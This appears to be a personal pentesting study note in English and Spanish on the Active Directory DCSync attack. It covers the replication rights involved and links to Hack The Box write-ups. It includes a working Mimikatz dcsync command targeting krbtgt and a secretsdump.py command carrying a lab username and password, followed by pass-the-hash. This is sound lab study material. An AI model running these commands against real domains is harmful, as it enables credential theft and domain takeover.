
## DESCRIPTION

The **DCSync** permission implies having these permissions over the domain itself: **DS-Replication-Get-Changes**, **Replicating Directory Changes All** and **Replicating Directory Changes In Filtered Set**.

**Important Notes about DCSync:**

-   The **DCSync attack simulates the behavior of a Domain Controller and asks other Domain Controllers to replicate information** using the Directory Replication Service Remote Protocol (MS-DRSR). Because MS-DRSR is a valid and necessary function of Active Directory, it cannot be turned off or disabled.
-   By default only **Domain Admins, Enterprise Admins, Administrators, and Domain Controllers** groups have the required privileges.
-   If any account passwords are stored with reversible encryption, an option is available in Mimikatz to return the password in clear text

Bloodhound lo detecta:

![[Pasted image 20230311184232.png]]

**!!NOTA IMPORTANTE!!** 
* EXISTE UNA ESCALADA DE PRIVILEGIOS MUY IMPORTANTE CON [[Join Exchange Windows Permissions Group]] MIRAR AQUI:  https://0xdf.gitlab.io/2020/03/21/htb-forest.html#privesc-to-administrator



To launch such a replication, a user needs to have the Replicating Directory Changes, Replicating Directory Changes All, and Replicating Directory Changes in Filtered Set rights. By default, members of the Domain Admins, Enterprise Admins, and Administrators groups have these rights assigned.

If we obtain access to a user account in one of these groups or with these rights assigned, we can perform a dcsync4 attack in which we impersonate a domain controller. This allows us to request any user credentials from the domain.

#### Mas información
* https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/dcsync
* https://0xdf.gitlab.io/2020/07/18/htb-sauna.html

## EXPLOITATION

### OPTION 1: Mimikatz

```
Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
```

### OPTION 2: Desde la KALI

1. Utilizamos secretdumps

```

# Ejemplo de uso, tambien le puedes meter el dominio
secretsdump.py -just-dc svc_loanmgr:'Moneymakestheworldgoround!'@10.10.10.175 -outputfile dcsync_hashes
```
![[Pasted image 20230311184113.png]]

2. Puedes usar directamente el hash haciendo PTH

![[Pasted image 20230311184135.png]]

## MACHINES

* Hack The Box: Sauna, Forest